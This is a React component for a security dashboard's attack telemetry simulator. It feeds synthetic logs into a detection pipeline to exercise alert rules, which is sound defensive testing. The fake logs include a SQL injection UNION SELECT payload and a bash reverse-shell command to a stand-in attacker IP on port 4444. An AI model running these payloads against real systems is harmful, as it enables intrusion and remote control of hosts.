import React, { useState } from 'react';
import { Modal } from '../common/Modal';
import { eventsApi } from '../../api/events';
import { Play, Zap, CheckCircle2, AlertTriangle, ShieldCheck, Terminal } from 'lucide-react';

interface Props {
  isOpen: boolean;
  onClose: () => void;
  onRefreshData?: () => void;
}

export const SimulatorModal: React.FC<Props> = ({ isOpen, onClose, onRefreshData }) => {
  const [loading, setLoading] = useState(false);
  const [logOutputs, setLogOutputs] = useState<string[]>([]);
  const [selectedScenario, setSelectedScenario] = useState<string>('brute_force');

  const runSimulation = async (scenario: string) => {
    setLoading(true);
    setLogOutputs([]);
    const outputs: string[] = [];

    const addLog = (msg: string) => {
      outputs.push(msg);
      setLogOutputs([...outputs]);
    };

    try {
      if (scenario === 'sqli') {
        addLog('[-] Executing Scenario: Web SQL Injection Attack on web-lb-01');
        const raw = '203.0.113.99 - - [18/Aug/2026:21:05:00 +0000] "GET /login?user=admin\'%20UNION%20SELECT%201,password%20FROM%20users-- HTTP/1.1" 403 210 "-" "sqlmap/1.7"';
        const res = await eventsApi.ingestLog('nginx', raw, 'web-lb-01');
        addLog(`[+] Ingested event ${res.event_id} | Alerts triggered: ${res.alerts_generated}`);
      } else if (scenario === 'brute_force') {
        addLog('[-] Executing Scenario: SSH Password Spray (5 failed attempts in 2s)');
        for (const u of ['admin', 'root', 'devops', 'deploy', 'backup']) {
          const raw = `Aug 18 21:05:10 db-cluster-01 sshd[1299]: Failed password for invalid user ${u} from 198.51.100.77 port 48102 ssh2`;
          const res = await eventsApi.ingestLog('linux-auth', raw, 'db-cluster-01');
          addLog(`[+] Sent failed attempt for '${u}' -> Generated alerts: ${res.alerts_generated}`);
          await new Promise((r) => setTimeout(r, 200));
        }
      } else if (scenario === 'priv_esc') {
        addLog('[-] Executing Scenario: Sudo Root Privilege Escalation');
        const raw = "Aug 18 21:06:00 db-cluster-01 sudo: deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash";
        const res = await eventsApi.ingestLog('linux-auth', raw, 'db-cluster-01');
        addLog(`[+] Ingested privilege escalation event -> Generated alerts: ${res.alerts_generated}`);
      } else if (scenario === 'reverse_shell') {
        addLog('[-] Executing Scenario: Critical Reverse Shell Process Spawn');
        const raw = '{"host":"db-cluster-01","process":"/bin/bash -i >& /dev/tcp/198.51.100.77/4444 0>&1","pid":9912,"user":"root","event_type":"suspicious_process","severity":"critical"}';
        const res = await eventsApi.ingestLog('custom', raw, 'db-cluster-01');
        addLog(`[+] Ingested C2 reverse shell payload -> Generated alerts: ${res.alerts_generated}`);
      }

      addLog('[SUCCESS] Simulation sequence completed! Refreshing SOC telemetry.');
      if (onRefreshData) onRefreshData();
    } catch (err: any) {
      addLog(`[ERROR] Ingestion failed: ${err.message || err}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <Modal isOpen={isOpen} onClose={onClose} title="Cyber Attack Telemetry Simulator" maxWidth="max-w-2xl">
      <div className="space-y-4">
        <p className="text-xs text-slate-400">
          Select an attack scenario to inject real-time security events directly into the EYE Ingestion Pipeline and observe live detection, rule triggers, and alert correlation.
        </p>

        {/* Scenario Select Buttons */}
        <div className="grid grid-cols-2 gap-3">
          <button
            onClick={() => setSelectedScenario('brute_force')}
            className={`p-3 rounded-lg border text-left transition-all ${
              selectedScenario === 'brute_force'
                ? 'bg-cyan-500/15 border-cyan-500/50 text-cyan-300 shadow-glow-blue'
                : 'bg-slate-900/60 border-slate-800 text-slate-300 hover:bg-slate-800/60'
            }`}
          >
            <div className="flex items-center gap-2 font-mono text-xs font-semibold mb-1">
              <Zap className="w-4 h-4 text-orange-400" />
              SSH Brute Force (5x)
            </div>
            <div className="text-[11px] text-slate-400">
              Triggers sliding window threshold detection rule.
            </div>
          </button>

          <button
            onClick={() => setSelectedScenario('sqli')}
            className={`p-3 rounded-lg border text-left transition-all ${
              selectedScenario === 'sqli'
                ? 'bg-cyan-500/15 border-cyan-500/50 text-cyan-300 shadow-glow-blue'
                : 'bg-slate-900/60 border-slate-800 text-slate-300 hover:bg-slate-800/60'
            }`}
          >
            <div className="flex items-center gap-2 font-mono text-xs font-semibold mb-1">
              <AlertTriangle className="w-4 h-4 text-amber-400" />
              Web SQL Injection (SQLi)
            </div>
            <div className="text-[11px] text-slate-400">
              Web access log parser with UNION SELECT payload.
            </div>
          </button>

          <button
            onClick={() => setSelectedScenario('priv_esc')}
            className={`p-3 rounded-lg border text-left transition-all ${
              selectedScenario === 'priv_esc'
                ? 'bg-cyan-500/15 border-cyan-500/50 text-cyan-300 shadow-glow-blue'
                : 'bg-slate-900/60 border-slate-800 text-slate-300 hover:bg-slate-800/60'
            }`}
          >
            <div className="flex items-center gap-2 font-mono text-xs font-semibold mb-1">
              <ShieldCheck className="w-4 h-4 text-purple-400" />
              Sudo Root Escalation
            </div>
            <div className="text-[11px] text-slate-400">
              Linux PAM/Sudo parser detecting root escalation.
            </div>
          </button>

          <button
            onClick={() => setSelectedScenario('reverse_shell')}
            className={`p-3 rounded-lg border text-left transition-all ${
              selectedScenario === 'reverse_shell'
                ? 'bg-cyan-500/15 border-cyan-500/50 text-cyan-300 shadow-glow-blue'
                : 'bg-slate-900/60 border-slate-800 text-slate-300 hover:bg-slate-800/60'
            }`}
          >
            <div className="flex items-center gap-2 font-mono text-xs font-semibold mb-1">
              <Terminal className="w-4 h-4 text-red-400" />
              C2 Reverse Shell Spawn
            </div>
            <div className="text-[11px] text-slate-400">
              Critical severity endpoint execution anomaly.
            </div>
          </button>
        </div>

        {/* Action Trigger */}
        <button
          disabled={loading}
          onClick={() => runSimulation(selectedScenario)}
          className="w-full py-2.5 bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-mono font-bold text-xs rounded-lg transition-all flex items-center justify-center gap-2 shadow-glow-blue disabled:opacity-50"
        >
          <Play className="w-4 h-4 fill-current" />
          {loading ? 'Injecting Telemetry...' : 'Inject Selected Attack Telemetry'}
        </button>

        {/* Live Output Log Terminal */}
        {logOutputs.length > 0 && (
          <div className="bg-black/80 rounded-lg p-3 font-mono text-xs text-emerald-400 border border-slate-800 max-h-48 overflow-y-auto space-y-1">
            {logOutputs.map((msg, i) => (
              <div key={i} className="leading-relaxed">
                {msg}
              </div>
            ))}
          </div>
        )}
      </div>
    </Modal>
  );
};
